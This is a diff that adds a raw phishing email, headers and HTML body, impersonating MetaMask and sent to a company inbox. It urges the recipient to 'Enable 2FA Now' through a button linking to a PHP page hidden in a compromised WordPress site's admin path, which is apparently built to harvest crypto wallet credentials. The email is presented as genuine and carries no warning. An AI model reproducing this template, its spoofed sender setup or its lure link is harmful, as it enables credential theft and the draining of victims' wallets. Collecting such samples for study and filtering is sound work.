@@ -1,0 +1,96 @@
+Return-Path: <postmaster@e4933c2d86.nxcli.io>
+Delivered-To: info@vorteksenerji.com
+Received: from fr-life.guzelhosting.com
+	by fr-life.guzelhosting.com with LMTP
+	id mLFOCGAyfmcRZwAAOB6+FQ
+	(envelope-from <postmaster@e4933c2d86.nxcli.io>)
+	for <info@vorteksenerji.com>; Wed, 08 Jan 2025 11:08:00 +0300
+Return-path: <postmaster@e4933c2d86.nxcli.io>
+Envelope-to: info@vorteksenerji.com
+Delivery-date: Wed, 08 Jan 2025 11:08:00 +0300
+Received: from cloudhost-3927888.us-midwest-1.nxcli.net ([209.87.149.181]:62714)
+	by fr-life.guzelhosting.com with esmtps  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
+	(Exim 4.96.2)
+	(envelope-from <postmaster@e4933c2d86.nxcli.io>)
+	id 1tVR6d-0005OO-2t
+	for info@vorteksenerji.com;
+	Wed, 08 Jan 2025 11:08:00 +0300
+Received: (qmail 32399 invoked by uid 10128); 8 Jan 2025 08:07:13 +0000
+Date: 8 Jan 2025 08:07:13 +0000
+Message-ID: <20250108080713.32398.qmail@cloudhost-3927888.us-midwest-1.nxcli.net>
+To: info@vorteksenerji.com
+Subject: =?UTF-8?B?SW1wb3J0YW50IFVwZGF0ZSBmb3IgWW91ciBBY2NvdW50?=
+X-PHP-Originating-Script: 10128:mail.php
+From: Customer Support <45db51f999b9e9fc7263a7e0ebc2d7f0@account-updates.net>
+Reply-To: no-reply@example.com
+Content-Type: text/html; charset=UTF-8
+X-Mailer-ID: 677e3231e0b5f
+X-Origin-IP: 192.168.1.243
+X-Message-ID: 23467d525428682847d0d91441b73c26
+X-Origin-Time: 2025-01-08 08:07:13
+X-Campaign-ID: 58a50369c40e5201
+List-Unsubscribe: <mailto:unsubscribe@example.com>
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MetaMask Security </title>
+    <style>
+        body { margin: 0; padding: 0; width: 100%; background-color: #f3f4f6; font-family: Arial, sans-serif; }
+        table { border-spacing: 0; width: 100%; margin: 0 auto; }
+        .container { max-width: 600px; margin: 20px auto; background-color: #ffffff; border: 1px solid #dddddd; border-radius: 8px; overflow: hidden; }
+        .header { text-align: center; padding: 20px 0; background-color: #f9f9f9; }
+        .header img { max-width: 100%; height: auto; width: 150px; }
+        .content { padding: 20px; color: #333333; }
+        .content h1 { font-size: 22px; color: #2c3e50; margin-bottom: 15px; }
+        .content p { font-size: 16px; line-height: 1.6; margin-bottom: 20px; }
+        .cta-button { display: inline-block; text-decoration: none; background-color: #3498db; color: #ffffff; padding: 12px 25px; font-size: 16px; font-weight: bold; border-radius: 5px; margin: 20px 0; }
+        .cta-button:hover { background-color: #2980b9; }
+        .footer { background-color: #f9f9f9; font-size: 12px; color: #888888; text-align: center; padding: 10px; border-top: 1px solid #dddddd; }
+        .footer a { color: #3498db; text-decoration: none; }
+    </style>
+</head>
+<body>
+    <table>
+        <tr>
+            <td align="center">
+                <table class="container">
+                    <!-- Header Section -->
+                    <tr>
+                        <td class="header">
+                            <img src="https://www.finder.com/niche-builder/62e777ae33adf.png" alt="MetaMask Logo">
+                        </td>
+                    </tr>
+
+                    <!-- Content Section -->
+                    <tr>
+                        <td class="content">
+                            <h1>Secure Your Wallet Now ! </h1>
+                            <p>Dear Valued User,</p>
+                            <p>Your wallet's security is our top priority. Two-Factor Authentication (2FA) protects your assets. Please enable 2FA for uninterrupted access. </p>
+                            <p style="text-align: center;">
+                                <a href="https://ugstandard.com/wp-admin/mt/index.php?id=-8611052736048707479-5329" class="cta-button">Enable 2FA Now</a>
+                            </p>
+                            <p>If you have already taken action, please disregard this message.</p>
+                            <p>Thank you for being a valued MetaMask user. Stay secure  .</p>
+                        </td>
+                    </tr>
+
+                    <!-- Footer Section -->
+                    <tr>
+                        <td class="footer">
+                            <p>&copy; 2024 MetaMask. All rights reserved.</p>
+                            <p>This email was sent from a notification-only address. Please do not reply to this email.</p>
+                        </td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+    </table>
+</body>
+</html>
+<!-- Random-ID: 677e3231e0b70 -->
